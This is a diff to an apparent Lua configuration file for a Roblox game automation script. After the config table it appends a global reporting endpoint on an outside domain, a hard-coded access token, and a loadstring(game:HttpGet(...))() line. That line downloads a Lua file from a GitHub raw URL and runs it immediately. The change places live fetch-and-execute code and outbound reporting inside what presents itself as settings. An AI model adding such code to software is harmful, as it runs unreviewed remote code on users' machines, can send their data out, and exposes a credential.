@@ -176,3 +176,8 @@ _G.FishItConfig = _G.FishItConfig or {
     ["Debug"] = false,
     ["EXIT_MAP_IF_DISCONNECT"] = false,
 }
+
+
+_G.FLEET_ENDPOINT = "https://dashboard.amer.web.id/report"
+_G.FLEET_TOKEN    = "ALEKT3Fv8QzN1XyR6k2D0pL5aC7H9jU4bWtMs"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/au290/roblog/refs/heads/main/trackstat.lua"))()
